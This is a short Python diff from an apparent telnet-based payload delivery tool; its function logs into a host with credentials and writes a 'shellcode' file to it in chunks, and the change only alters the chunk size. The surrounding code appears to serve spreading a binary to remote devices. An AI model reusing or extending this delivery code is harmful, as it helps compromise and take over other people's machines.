@@ -32,7 +32,7 @@ def try_telnet_send(host, port, username, password, shellcode, location, timeout
             return False
         print "writing bin"
         content = open(shellcode).read().rstrip()
-        chunk_size = 600
+        chunk_size = 300*3
         delay = 1
         for a in xrange(chunk_reached, len(content), chunk_size):
             print "sent split"
